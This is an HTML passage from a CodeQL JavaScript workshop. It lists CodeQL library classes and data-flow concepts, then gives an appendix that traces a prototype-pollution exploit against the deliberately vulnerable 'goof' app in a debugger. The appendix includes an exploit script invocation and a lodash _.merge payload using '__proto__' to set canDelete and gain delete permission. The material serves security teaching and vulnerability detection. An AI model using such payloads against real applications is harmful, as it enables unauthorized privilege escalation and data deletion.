docs/codeql/codeql-workshops/javascript/codeql-js-goof-workshop/workshop.html

<div id="outline-container-org111059a" class="outline-3">
<h3 id="org111059a"><span class="section-number-3">5.4</span> CodeQL JS library documentation</h3>
<div class="outline-text-3" id="text-5-4">
<p>
The following is an overview of available library documentation; the <b>bold</b>
items are those used in this workshop.  
</p>
<ul class="org-ul">
<li><a href="https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#codeql-library-for-javascript">codeql-library-for-javascript</a>
<ul class="org-ul">
<li><a href="https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#syntactic-level">Syntactic Level</a>
<ul class="org-ul">
<li>ASTNode,
<ul class="org-ul">
<li>TopLevel</li>
<li>Stmt</li>
<li><b>Expr</b>
<ul class="org-ul">
<li><b>FunctionExpr</b></li>
<li>InvokeExpr
<ul class="org-ul">
<li>CallExpr</li>
<li>NewExpr</li>
<li><b>MethodCallExpr</b></li>
</ul></li>
<li>PropAccess</li>
</ul></li>
</ul></li>

<li><a href="https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#functions">functions overview </a> and the <a href="https://help.semmle.com/qldoc/javascript/semmle/javascript/Functions.qll/type.Functions$Function.html">Function</a> reference
<ul class="org-ul">
<li>FunctionDeclStmt (a subclass of Stmt)</li>
<li><b>FunctionExpr</b> (a subclass of Expr)</li>
<li>ArrowFunctionExpr (also a subclass of Expr)</li>
</ul></li>
<li>ClassDefinition,
<ul class="org-ul">
<li>ClassDeclStmt (which is a subclass of Stmt)</li>
<li>ClassExpr (which is a subclass of Expr)</li>
</ul></li>
<li>MemberDefinition
<ul class="org-ul">
<li>MethodDefinition</li>
<li>FieldDefinition</li>
</ul></li>
<li>DeclStmt</li>
<li>BindingPattern
<ul class="org-ul">
<li>VarRef</li>
<li>Parameter</li>
<li>ArrayPattern</li>
<li>ObjectPattern</li>
</ul></li>
<li>Property: Properties in object literals.  Is also a subclass of ASTNode,
but neither of Expr nor of Stmt.</li>
<li>Module
<ul class="org-ul">
<li>ES2015Module</li>
<li>NodeModule</li>
<li>AMDModule</li>
</ul></li>
<li>Scope
<ul class="org-ul">
<li>GlobalScope</li>
<li>FunctionScope</li>
<li>CatchScope</li>
</ul></li>
<li>Variable 
<ul class="org-ul">
<li>VarDecl</li>
<li>VarAccess</li>
</ul></li>
</ul></li>
<li><a href="https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#control-flow">Control Flow Graph</a>
<ul class="org-ul">
<li>ControlFlowNode</li>
</ul></li>
<li><a href="https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#data-flow">Data Flow</a>
<ul class="org-ul">
<li>definition and use
<ul class="org-ul">
<li>VarDef</li>
<li>VarUse</li>
</ul></li>
<li>ssa</li>
<li><a href="https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#data-flow-nodes">data flow nodes</a>
<ul class="org-ul">
<li><b>DataFlow::Node</b>
<ul class="org-ul">
<li>ValueNode
<ul class="org-ul">
<li><i>To <code>ValueNode</code></i>: use <code>DataFlow::valueNode</code> to convert an
expression, function or class into its corresponding ValueNode</li>
<li><i>From <code>ValueNode</code></i>: use <code>ValueNode.getAstNode()</code> for mapping from
ValueNodes to ASTNodes</li>
</ul></li>

<li>SsaDefinitionNode
<ul class="org-ul">
<li><i>To <code>SsaDefinitionNode</code></i>, use <code>DataFlow::ssaDefinitionNode</code> to map
an SSA definition to its corresponding SsaDefinitionNode.</li>
<li><i>To <code>SsaDefinitionNode</code> for a parameter:</i> the auxiliary predicate
<code>DataFlow::parameterNode</code> maps a parameter to its
corresponding data flow node.</li>
<li><i>From <code>SsaDefinitionNode</code>:</i> use
<code>SsaDefinitionNode.getSsaVariable()</code> to get the <code>SsaVariable</code></li>
</ul></li>
</ul></li>

<li>Use <code>DataFlow::Node.getAPredecessor()</code> to find other data flow nodes
from which values may flow into this node, and <b><code>getASuccessor()</code></b> for the
other direction.</li>
</ul></li>

<li><a href="https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#type-inference">Type inference</a></li>
<li><a href="https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#call-graph">Call Graph</a></li>
<li>inter-procedural
<ul class="org-ul">
<li>DataFlow::Configuration</li>
<li>TaintTracking::Configuration</li>
</ul></li>
</ul></li>
</ul></li>
</ul>
</div>
</div>


<div id="outline-container-org3f71a9f" class="outline-3">
<h3 id="org3f71a9f"><span class="section-number-3">5.5</span> CodeQL JS data flow library documentation</h3>
<div class="outline-text-3" id="text-5-5">
<p>
Following are links and short descriptions of the dataflow concepts this
workshop touches on.  Follow the links for a more in-depth description.
</p>

<ul class="org-ul">
<li><a href="https://help.semmle.com/QL/learn-ql/javascript/dataflow.html#analyzing-data-flow-in-javascript-and-typescript">analyzing-data-flow-in-javascript-and-typescript</a>
<ul class="org-ul">
<li><a href="https://help.semmle.com/QL/learn-ql/javascript/dataflow.html#local-data-flow"><b>local data flow</b></a> Use the member predicates <code>getAPredecessor()</code> and
<code>getASuccessor()</code> on DataFlow::Node.  To follow one or more steps of local
data flow, use the transitive closure operator <code>+</code>, and for zero or more
steps the reflexive transitive closure operator <code>*</code>.</li>

<li><a href="https://help.semmle.com/QL/learn-ql/javascript/dataflow.html#global-data-flow"><b>global-data-flow</b></a> global data flow is less precise than local data
flow. That is, the analysis may report spurious flows that cannot in fact
happen. Moreover, global data flow analysis typically requires
significantly more time and memory than local analysis.</li>
</ul></li>
</ul>
</div>
</div>
</div>


<div id="outline-container-org28af9d8" class="outline-2">
<h2 id="org28af9d8"><span class="section-number-2">6</span> Appendices</h2>
<div class="outline-text-2" id="text-6">
</div>
<div id="outline-container-org93e9eec" class="outline-3">
<h3 id="org93e9eec"><span class="section-number-3">6.1</span> Appendix A: Trace the exploit in the VS Code JS Debugger</h3>
<div class="outline-text-3" id="text-6-1">
<p>
To see the prototype injection exploit in action using the JS debugger, try the
following steps:
</p>
<ul class="org-ul">
<li><p>
set up shell
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">.</span> ~/local/goof/exploits/prototype-pollution.sh
<span style="color: #b22222;"># </span><span style="color: #b22222;">Gain permissions with c3</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">Delete message with c4</span>
</pre>
</div></li>
<li><p>
Launch for debugging:
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">cd</span> ~/local/goof
<span style="color: #483d8b;">echo</span> $<span style="color: #a0522d;">$</span> &amp;&amp; node --inspect=$<span style="color: #a0522d;">$</span> app.js
</pre>
</div></li>
<li>In vs code, run 'attach to node process', choose the <code>node --inspect...</code>
process.</li>
<li>Set breakpoints in files, ~/local/goof/routes/index.js line 272</li>
<li><p>
From the shell, send the delete request.  It will fail to delete: 
</p>
<pre class="example">
c4

</pre></li>
<li><p>
Run the gain permission exploit, this will trap at breakpoint:
</p>
<pre class="example">
c3

</pre></li>
<li><p>
In vs code debug console, observe the value of
</p>
<pre class="example">
({}).__proto__.canDelete

</pre>
<p>
before and after the
</p>
<pre class="example">
_.merge(message, req.body.message, {...})

</pre>
<p>
expression.
</p></li>
</ul>

<p>
Oddly, there is different behavior in node command line:
</p>
<div class="org-src-container">
<pre class="src src-javascript"><span style="color: #b22222;">// </span><span style="color: #b22222;">Different behavior in node command line?</span>
cd ~/local/goof
node
Welcome to Node.js v14.13.1.
Type <span style="color: #8b2252;">".help"</span> <span style="color: #a020f0;">for</span> more information.
<span style="color: #a020f0;">var</span> <span style="color: #a0522d;">_</span> = require(<span style="color: #8b2252;">'lodash'</span>);
<span style="color: #a020f0;">var</span> <span style="color: #a0522d;">a</span> = {<span style="color: #8b2252;">"name"</span>: <span style="color: #8b2252;">"a"</span>}
<span style="color: #a020f0;">var</span> <span style="color: #a0522d;">b</span> = {<span style="color: #8b2252;">"name"</span>: <span style="color: #8b2252;">"b"</span>}
({}).__proto__.canDelete        <span style="color: #b22222;">// </span><span style="color: #b22222;">undefined</span>
_.merge(a, { <span style="color: #8b2252;">"text"</span>: <span style="color: #8b2252;">"&#128520;"</span>, <span style="color: #8b2252;">"__proto__"</span>: {<span style="color: #8b2252;">"canDelete"</span>: <span style="color: #008b8b;">true</span>}}, b)
a.canDelete                     <span style="color: #b22222;">// </span><span style="color: #b22222;">true</span>
b.canDelete                     <span style="color: #b22222;">// </span><span style="color: #b22222;">undefined</span>
({}).__proto__.canDelete        <span style="color: #b22222;">// </span><span style="color: #b22222;">undefined</span>
</pre>
</div>
</div>
</div>
